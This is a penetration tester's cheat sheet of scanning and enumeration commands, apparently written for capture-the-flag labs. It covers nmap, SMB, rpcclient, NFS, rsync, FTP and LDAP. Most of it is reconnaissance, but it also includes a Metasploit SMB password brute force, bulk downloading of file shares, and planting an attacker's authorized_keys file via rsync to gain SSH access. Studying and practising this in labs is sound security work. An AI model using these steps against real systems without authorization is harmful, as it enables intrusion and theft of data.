# Scanning & Enumeration

## Scanning with nmap

```
nmap -T4 -p- -A
```

```
nmap -sV -sC -oA $file $IP
```

### nmap Scripting Language

```
nmap -p $PORT --script $NAME -oA $IP
```

Script names can be: safe, vuln, discovery, version,brute, intrusive, auth, broadcast

## Enumerating SMB

### SMB client

```
smbclient -L \\\\192.168.57.134\\
```

```
smbclient \\\\192.168.57.134\\FileShare

To download all of the files in a share
smbclient //192.168.57.134/FileShare
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP
```

### SMB map

```
smbmap -u USER -H IP
smbmap -H IP -R --depth 5

search for files
smbmap -R FOLDER -H IP

download files
smbmap -R FOLDER -H IP -A Group.xml -q

using creds
smbmap -d active.htb -u user -p password -H IP
```

To mount smb shares

```
mount -t cifs //IP/folder /mnt/smb
mount -t cifs -o username=USER //IP//SHARE /mnt/smb
```

### Brute force smb login

```
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set pass_file wordlist
pass_file => wordlist
msf5 auxiliary(scanner/smb/smb_login) > set USER_file users.txt
USER_file => users.txt
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS fuse.htb
msf5 auxiliary(scanner/smb/smb_login) > run
```

Find creds and run smb client again

## Enumerating using rpcclient

```
rpcclient -U DOMAIN\\user IP

rpcclient $> enumdomusers
rpcclient $> enumprivs
rpcclient $> enumprinters
```

## Enumerating Mounts(RPCbind)

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.148.131
```

## Enumerating NFS

to list the NFS shares

```
/usr/sbin/showmount -e [IP]
```

to mount shares

```
sudo mount -t nfs 10.10.143.241:home /tmp/mount/ -nolock
```

## Enumerating rsync

```bash

nmap -sV --script "rsync-list-modules" -p <PORT> <IP>

rsync --list-only rsync://rsync-connect@$IP/
rsync -av --list-only rsync://$IP:873
rsync -av --list-only rsync://192.168.0.123/shared_name
```

Copy all files

```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

Creating a folder and copying the files

```
rsync -a /root/thm/authorized_keys rsync://rsync-connect@$IP/files/sys-internal/.ssh/

rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```

## Enum4Linux

## Enum telnet

```
telnet IP PORT
```

### check for pings (tcpdump)

```
Listener
sudo tcpdump ip proto \\icmp -i tun0

ping IP -c 1
```

## FTP

```
ftp IP
anonymous login
enable binary mode
binary
```

### Downloading FTP

```
wget --user USER --password PASSWORD -r ftp://IP
```

### telnet over FTP

```
telnet IP PORT
site cpfr /path-of-file/folder-to-copy
site cpto /path-where-to-copy
```

## LDAP

```
To get the domain name
ldapsearch -x h IP -s base namingcontexts

To get the domain information
ldapsearch -x h IP -s sub -b 'DC=cascade,DC=local'
```

## Additional Scanning Tools

### Masscan

```
mass -p1-65535 --rate 1000 192.168.57.134
```

### Autorecon

https://github.com/Tib3rius/AutoRecon
